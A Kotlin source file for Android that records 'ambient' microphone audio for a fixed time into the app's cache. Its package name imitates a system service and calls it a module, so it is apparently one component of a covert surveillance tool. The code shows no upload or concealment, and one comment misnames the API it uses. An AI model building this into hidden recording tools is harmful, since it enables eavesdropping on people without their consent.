// [context: Kotlin, Android API 26+, ambient mic recording via AudioRecord]
package com.system.service.modules.mic

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import java.io.File

class AudioRecorder(private val context: Context) {

    private var recorder: MediaRecorder? = null

    fun start(durationMs: Long = 60_000L, onDone: (File?) -> Unit) {
        val f = File(context.cacheDir, "aud_${System.currentTimeMillis()}.m4a")
        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(context) else @Suppress("DEPRECATION") MediaRecorder()
        recorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(22050)
            setAudioChannels(1)
            setMaxDuration(durationMs.toInt())
            setOutputFile(f.absolutePath)
            setOnInfoListener { _, what, _ ->
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    stop(); onDone(f)
                }
            }
            try { prepare(); start() }
            catch (_: Exception) { onDone(null) }
        }
    }

    fun stop(): File? {
        return try {
            recorder?.stop()
            recorder?.release()
            recorder = null
            null
        } catch (_: Exception) { null }
    }
}
